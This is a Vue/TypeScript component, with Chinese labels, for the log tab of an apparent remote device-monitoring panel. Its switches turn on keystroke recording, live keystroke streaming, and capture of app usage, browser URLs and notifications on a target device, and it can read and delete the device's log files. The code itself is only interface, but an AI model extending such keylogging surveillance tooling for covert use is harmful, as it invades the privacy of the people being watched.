<script setup lang="ts">
import { ref, computed, h } from 'vue';
import {
    NSpace,
    NButton,
    NSelect,
    NSwitch,
    NDataTable,
    NEmpty,
    NSpin,
    NIcon,
    NGrid,
    NGridItem,
    NDivider,
    NDatePicker,
    NTag,
    NPopconfirm,
    NScrollbar,
} from 'naive-ui';
import {
    RefreshOutline,
    TrashOutline,
    DocumentTextOutline,
    SettingsOutline,
    FolderOpenOutline,
    TimeOutline,
    SearchOutline,
} from '@vicons/ionicons5';
import type { LogType, LogOptions, DeviceLogEntry } from '@/types/device';
import { LOG_TYPE_LABELS } from '@/types/device';

interface Props {
    loading: boolean;
    logFiles: Record<string, string>;
    logContent: string;
    logOptions: LogOptions;
    historicalLogs: DeviceLogEntry[];
    historicalTotal: number;
    historicalLoading: boolean;
}

interface Emits {
    (e: 'getLogOptions'): void;
    (e: 'setLogOptions', options: Partial<LogOptions>): void;
    (e: 'getAllLogLists'): void;
    (e: 'getLogList', type: LogType): void;
    (e: 'readLog', type: LogType, filename: string): void;
    (e: 'deleteLog', type: LogType, filename: string): void;
    (e: 'clearLogs', type: LogType): void;
    (e: 'clearAllLogs'): void;
    (e: 'fetchHistorical', params: {
        log_type?: LogType;
        start_time?: string;
        end_time?: string;
        per_page?: number;
        page?: number;
    }): void;
}

const props = defineProps<Props>();
const emit = defineEmits<Emits>();

const activeSection = ref<'options' | 'files' | 'history'>('history');
const selectedLogType = ref<LogType>('KSTR');
const historyLogType = ref<LogType | null>(null);
const historyDateRange = ref<[number, number] | null>(null);
const historyPage = ref(1);

const logTypeOptions = computed(() =>
    Object.entries(LOG_TYPE_LABELS).map(([value, label]) => ({
        label: `${label} (${value})`,
        value,
    }))
);

const parsedFileList = computed(() => {
    const files: Array<{ type: string; filename: string; typeLabel: string }> = [];
    for (const [type, fileStr] of Object.entries(props.logFiles)) {
        if (!fileStr || fileStr === 'null') continue;
        const parts = fileStr.split('<*P*>').filter(Boolean);
        for (const part of parts) {
            files.push({
                type,
                filename: part,
                typeLabel: LOG_TYPE_LABELS[type as LogType] ?? type,
            });
        }
    }
    return files;
});

const fileColumns = [
    { title: '类型', key: 'typeLabel', width: 100 },
    { title: '文件名', key: 'filename' },
    {
        title: '操作',
        key: 'actions',
        width: 140,
        render: (row: { type: string; filename: string }) => {
            return h(NSpace, { size: 'small' }, () => [
                h(NButton, {
                    size: 'tiny',
                    type: 'info',
                    onClick: () => emit('readLog', row.type as LogType, row.filename),
                }, { default: () => '读取' }),
                h(NPopconfirm, {
                    onPositiveClick: () => emit('deleteLog', row.type as LogType, row.filename),
                }, {
                    trigger: () => h(NButton, { size: 'tiny', type: 'error' }, { default: () => '删除' }),
                    default: () => '确定删除此日志文件？',
                }),
            ]);
        },
    },
];

const historyColumns = [
    {
        title: '类型',
        key: 'log_type',
        width: 90,
        render: (row: DeviceLogEntry) =>
            h(NTag, { size: 'small', type: 'info' }, { default: () => LOG_TYPE_LABELS[row.log_type] ?? row.log_type }),
    },
    { title: '内容', key: 'content', ellipsis: { tooltip: true } },
    { title: '设备时间', key: 'device_timestamp', width: 170 },
];

const handleFetchHistory = () => {
    const params: Record<string, unknown> = { per_page: 50, page: historyPage.value };
    if (historyLogType.value) params.log_type = historyLogType.value;
    if (historyDateRange.value) {
        params.start_time = new Date(historyDateRange.value[0]).toISOString().split('T')[0];
        params.end_time = new Date(historyDateRange.value[1]).toISOString().split('T')[0];
    }
    emit('fetchHistorical', params);
};

const handlePageChange = (page: number) => {
    historyPage.value = page;
    handleFetchHistory();
};
</script>

<template>
    <div class="log-tab">
        <div class="tab-header">
            <NSpace>
                <NButton
                    :type="activeSection === 'history' ? 'primary' : 'default'"
                    size="small"
                    @click="activeSection = 'history'"
                >
                    <template #icon><NIcon :component="TimeOutline" /></template>
                    历史日志
                </NButton>
                <NButton
                    :type="activeSection === 'files' ? 'primary' : 'default'"
                    size="small"
                    @click="activeSection = 'files'; emit('getAllLogLists')"
                >
                    <template #icon><NIcon :component="FolderOpenOutline" /></template>
                    设备文件
                </NButton>
                <NButton
                    :type="activeSection === 'options' ? 'primary' : 'default'"
                    size="small"
                    @click="activeSection = 'options'; emit('getLogOptions')"
                >
                    <template #icon><NIcon :component="SettingsOutline" /></template>
                    日志设置
                </NButton>
            </NSpace>
        </div>

        <NDivider style="margin: 8px 0" />

        <!-- Section: Log Options -->
        <div v-if="activeSection === 'options'" class="section">
            <NSpin :show="loading">
                <NGrid :cols="2" :x-gap="12" :y-gap="12">
                    <NGridItem>
                        <div class="option-row">
                            <span>键盘记录 (KSTR)</span>
                            <NSwitch
                                :value="logOptions.recKeystrokes"
                                @update:value="(v: boolean) => emit('setLogOptions', { recKeystrokes: v })"
                            />
                        </div>
                    </NGridItem>
                    <NGridItem>
                        <div class="option-row">
                            <span>实时键盘流</span>
                            <NSwitch
                                :value="logOptions.liveKeystrokes"
                                @update:value="(v: boolean) => emit('setLogOptions', { liveKeystrokes: v })"
                            />
                        </div>
                    </NGridItem>
                    <NGridItem>
                        <div class="option-row">
                            <span>APP使用 (VAPS)</span>
                            <NSwitch
                                :value="logOptions.recApps"
                                @update:value="(v: boolean) => emit('setLogOptions', { recApps: v })"
                            />
                        </div>
                    </NGridItem>
                    <NGridItem>
                        <div class="option-row">
                            <span>浏览器URL (BLNK)</span>
                            <NSwitch
                                :value="logOptions.recLinks"
                                @update:value="(v: boolean) => emit('setLogOptions', { recLinks: v })"
                            />
                        </div>
                    </NGridItem>
                    <NGridItem>
                        <div class="option-row">
                            <span>通知内容 (NTFS)</span>
                            <NSwitch
                                :value="logOptions.recNotifications"
                                @update:value="(v: boolean) => emit('setLogOptions', { recNotifications: v })"
                            />
                        </div>
                    </NGridItem>
                </NGrid>
            </NSpin>
        </div>

        <!-- Section: Device-side log files -->
        <div v-else-if="activeSection === 'files'" class="section">
            <div class="file-actions">
                <NSpace>
                    <NButton size="small" @click="emit('getAllLogLists')">
                        <template #icon><NIcon :component="RefreshOutline" /></template>
                        刷新文件列表
                    </NButton>
                    <NPopconfirm @positive-click="emit('clearAllLogs')">
                        <template #trigger>
                            <NButton size="small" type="error">
                                <template #icon><NIcon :component="TrashOutline" /></template>
                                清空所有日志
                            </NButton>
                        </template>
                        确定清空设备上的所有日志文件？此操作不可逆。
                    </NPopconfirm>
                </NSpace>
            </div>

            <NSpin :show="loading">
                <NDataTable
                    v-if="parsedFileList.length > 0"
                    :columns="fileColumns"
                    :data="parsedFileList"
                    :bordered="false"
                    :max-height="300"
                    size="small"
                />
                <NEmpty v-else description="设备上没有日志文件" />
            </NSpin>

            <div v-if="logContent" class="log-content-viewer">
                <NDivider style="margin: 8px 0" />
                <div class="content-header">
                    <NIcon :component="DocumentTextOutline" size="16" />
                    <span>日志内容</span>
                </div>
                <NScrollbar style="max-height: 300px">
                    <pre class="log-content">{{ logContent }}</pre>
                </NScrollbar>
            </div>
        </div>

        <!-- Section: Historical logs from DB -->
        <div v-else-if="activeSection === 'history'" class="section">
            <div class="history-filters">
                <NSpace>
                    <NSelect
                        v-model:value="historyLogType"
                        :options="[{ label: '全部类型', value: null as unknown as string }, ...logTypeOptions]"
                        size="small"
                        style="width: 160px"
                        placeholder="日志类型"
                        clearable
                    />
                    <NDatePicker
                        v-model:value="historyDateRange"
                        type="daterange"
                        size="small"
                        clearable
                    />
                    <NButton size="small" type="primary" @click="handleFetchHistory">
                        <template #icon><NIcon :component="SearchOutline" /></template>
                        查询
                    </NButton>
                </NSpace>
            </div>

            <NSpin :show="historicalLoading">
                <NDataTable
                    v-if="historicalLogs.length > 0"
                    :columns="historyColumns"
                    :data="historicalLogs"
                    :bordered="false"
                    :max-height="400"
                    size="small"
                    :pagination="{
                        page: historyPage,
                        pageSize: 50,
                        itemCount: historicalTotal,
                        onUpdatePage: handlePageChange,
                    }"
                />
                <NEmpty v-else description="暂无历史日志，点击查询加载" />
            </NSpin>
        </div>
    </div>
</template>

<style scoped>
.log-tab {
    display: flex;
    flex-direction: column;
    gap: 8px;
}

.tab-header {
    display: flex;
    justify-content: flex-start;
    align-items: center;
}

.section {
    display: flex;
    flex-direction: column;
    gap: 12px;
}

.option-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 8px 12px;
    background: #f8fafc;
    border-radius: 8px;
    font-size: 13px;
}

.file-actions {
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.history-filters {
    display: flex;
    align-items: center;
    margin-bottom: 8px;
}

.log-content-viewer {
    display: flex;
    flex-direction: column;
    gap: 8px;
}

.content-header {
    display: flex;
    align-items: center;
    gap: 6px;
    font-size: 13px;
    color: #64748b;
    font-weight: 500;
}

.log-content {
    font-family: 'Fira Code', 'Consolas', monospace;
    font-size: 12px;
    line-height: 1.5;
    padding: 12px;
    background: #1e293b;
    color: #e2e8f0;
    border-radius: 8px;
    white-space: pre-wrap;
    word-break: break-all;
    margin: 0;
}
</style>
